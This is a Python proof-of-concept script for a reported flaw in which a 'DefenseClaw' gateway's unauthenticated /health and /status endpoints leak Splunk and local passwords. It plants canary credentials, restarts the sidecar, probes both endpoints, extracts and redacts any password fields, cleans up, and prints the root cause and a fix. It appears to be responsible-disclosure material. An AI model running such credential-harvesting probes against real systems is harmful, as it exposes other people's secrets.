#!/usr/bin/env python3
"""
PoC: Credential leakage via unauthenticated /health endpoint

Vulnerability:  reportSplunkHealth() in internal/gateway/sidecar.go (lines 495-505)
                reads SPLUNK_PASSWORD and DEFENSECLAW_LOCAL_PASSWORD from the
                splunk-bridge .env file and stores them in the health details map.
                The /health and /status API endpoints serialize this data as JSON
                to any caller with no authentication.

Attack surface: The API server listens on 127.0.0.1:{api_port} (default 18970).
                Any local process -- including a compromised MCP server, malicious
                skill, or SSRF from an LLM tool call -- can extract credentials
                with a single unauthenticated GET request.

Precondition:   The Splunk bridge .env file must exist with password entries.
                In production this is created by `defenseclaw setup splunk` when
                Docker is available. This PoC simulates the condition by writing
                the .env file directly, then restarting the sidecar so it picks
                up the new config.

Reproduce:
    1. Run `defenseclaw setup splunk` to enable Splunk integration
    2. Run this script:  python3 poc_health_credential_leak.py
    3. The script creates a synthetic splunk-bridge .env, restarts the sidecar,
       then queries /health and /status to extract leaked credentials.
    4. On exit the script cleans up the synthetic .env file.

Fix: Remove password fields from reportSplunkHealth() details map, or gate
     /health behind authentication.
"""

import json
import os
import subprocess
import sys
import time
import urllib.request
import urllib.error

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  DefenseClaw Health Endpoint Credential Leak PoC            ║
║  Affected: /health and /status (unauthenticated)            ║
╚══════════════════════════════════════════════════════════════╝
"""

DEFAULT_PORT = 18970
DATA_DIR = os.path.expanduser("~/.defenseclaw")
BRIDGE_ENV_DIR = os.path.join(DATA_DIR, "splunk-bridge")
BRIDGE_ENV_PATH = os.path.join(BRIDGE_ENV_DIR, ".env")

# Synthetic credentials -- obviously fake, used only for detection
CANARY_SPLUNK_PW = "PoC-SplunkPass-LEAKED-12345"
CANARY_LOCAL_PW = "PoC-LocalPass-LEAKED-67890"

SENSITIVE_KEYS = {"web_password", "password"}


def probe_endpoint(base_url: str, path: str) -> dict | None:
    """GET an endpoint and return parsed JSON, or None on failure."""
    url = f"{base_url}{path}"
    req = urllib.request.Request(url, method="GET")
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read())
    except urllib.error.URLError as exc:
        print(f"  [-] {path}: connection failed ({exc.reason})")
        return None
    except Exception as exc:
        print(f"  [-] {path}: unexpected error ({exc})")
        return None


def extract_credentials(data: dict) -> list[tuple[str, str, str]]:
    """Walk the JSON tree and collect any sensitive key/value pairs."""
    found = []

    def _walk(obj, path=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                dotted = f"{path}.{k}" if path else k
                if k in SENSITIVE_KEYS and isinstance(v, str) and v:
                    found.append((dotted, k, v))
                _walk(v, dotted)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                _walk(item, f"{path}[{i}]")

    _walk(data)
    return found


def setup_canary_env() -> bool:
    """Write a synthetic splunk-bridge .env with canary passwords.

    Returns True if the file was created (and should be cleaned up),
    False if it already existed (we don't touch it).
    """
    if os.path.exists(BRIDGE_ENV_PATH):
        print(f"[i] {BRIDGE_ENV_PATH} already exists -- using existing file")
        return False

    os.makedirs(BRIDGE_ENV_DIR, exist_ok=True)
    content = (
        f"SPLUNK_PASSWORD={CANARY_SPLUNK_PW}\n"
        f"DEFENSECLAW_LOCAL_USERNAME=poc_user\n"
        f"DEFENSECLAW_LOCAL_PASSWORD={CANARY_LOCAL_PW}\n"
    )
    fd = os.open(BRIDGE_ENV_PATH, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, "w") as f:
        f.write(content)
    print(f"[+] Created canary .env at {BRIDGE_ENV_PATH}")
    return True


def cleanup_canary_env():
    """Remove the synthetic .env file."""
    try:
        os.unlink(BRIDGE_ENV_PATH)
        print(f"[+] Cleaned up {BRIDGE_ENV_PATH}")
        # Remove the directory if empty
        try:
            os.rmdir(BRIDGE_ENV_DIR)
        except OSError:
            pass
    except FileNotFoundError:
        pass


def restart_sidecar() -> bool:
    """Restart the DefenseClaw gateway sidecar so it re-reads .env."""
    try:
        result = subprocess.run(
            ["defenseclaw-gateway", "restart"],
            capture_output=True,
            text=True,
            timeout=15,
        )
        if result.returncode == 0:
            print("[+] Sidecar restarted successfully")
            time.sleep(2)  # give it time to initialize
            return True
        else:
            print(f"  [-] Sidecar restart failed: {result.stderr.strip()}")
            return False
    except FileNotFoundError:
        print("  [-] defenseclaw-gateway not found in PATH")
        return False
    except subprocess.TimeoutExpired:
        print("  [-] Sidecar restart timed out")
        return False


def run(host: str = "127.0.0.1", port: int = DEFAULT_PORT) -> int:
    print(BANNER)

    # Step 1: Set up the canary .env so reportSplunkHealth() has passwords to read
    created = setup_canary_env()

    # Step 2: Restart sidecar to pick up the new .env
    print("[*] Restarting sidecar to load .env ...")
    if not restart_sidecar():
        print("[!] Could not restart sidecar. Trying to probe anyway...")

    # Step 3: Probe both endpoints
    base = f"http://{host}:{port}"
    leaked_total = []

    try:
        for path in ("/health", "/status"):
            print(f"\n[*] Probing {base}{path} ...")
            data = probe_endpoint(base, path)
            if data is None:
                continue

            print(f"  [+] Got {len(json.dumps(data))} bytes of JSON")

            creds = extract_credentials(data)
            if creds:
                print(f"  [!] VULNERABLE -- found {len(creds)} credential(s):\n")
                for dotted_path, key, value in creds:
                    # Redact middle of value for responsible disclosure
                    if len(value) > 4:
                        shown = value[:2] + "*" * (len(value) - 4) + value[-2:]
                    else:
                        shown = "****"
                    print(f"      Path:  {dotted_path}")
                    print(f"      Key:   {key}")
                    print(f"      Value: {shown}  ({len(value)} chars)")
                    print()
                leaked_total.extend(creds)
            else:
                print("  [i] No credentials found in response")

                # Check if the splunk details block exists at all
                splunk_details = data.get("splunk", {}).get("details")
                if splunk_details is None:
                    splunk_details = (
                        data.get("health", {}).get("splunk", {}).get("details")
                    )
                if splunk_details is not None:
                    print(f"  [i] Splunk details present: {list(splunk_details.keys())}")
                else:
                    print("  [i] Splunk subsystem has no details block "
                          "(may be disabled in config)")
    finally:
        # Step 4: Clean up
        if created:
            print()
            cleanup_canary_env()
            # Restart again to clear the leaked state from memory
            print("[*] Restarting sidecar to clear leaked state ...")
            restart_sidecar()

    print("\n" + "=" * 62)
    if leaked_total:
        print(f"[!] RESULT: {len(leaked_total)} credential(s) leaked via "
              f"unauthenticated endpoint(s)")
        print("[!] An attacker with local access (or SSRF) can extract these")
        print("    passwords without any authentication.\n")
        print("[*] Root cause:")
        print("    sidecar.go:498  details[\"web_password\"] = SPLUNK_PASSWORD")
        print("    sidecar.go:504  details[\"password\"] = DEFENSECLAW_LOCAL_PASSWORD")
        print("    api.go:149-155  GET /health returns full snapshot (no auth)\n")
        print("[*] Recommended fix:")
        print("    1. Remove password fields from reportSplunkHealth() details map")
        print("    2. Or require authentication on /health and /status endpoints")
        return 1
    else:
        print("[i] RESULT: No credentials found")
        print("[i] Possible reasons:")
        print("    - Sidecar is not running")
        print("    - Splunk integration is not enabled in config")
        print("    - The .env file was not loaded (check splunk.enabled in config)")
        return 0


if __name__ == "__main__":
    port = DEFAULT_PORT
    host = "127.0.0.1"

    if len(sys.argv) >= 2:
        host = sys.argv[1]
    if len(sys.argv) >= 3:
        try:
            port = int(sys.argv[2])
        except ValueError:
            print(f"Invalid port: {sys.argv[2]}", file=sys.stderr)
            sys.exit(2)

    sys.exit(run(host, port))
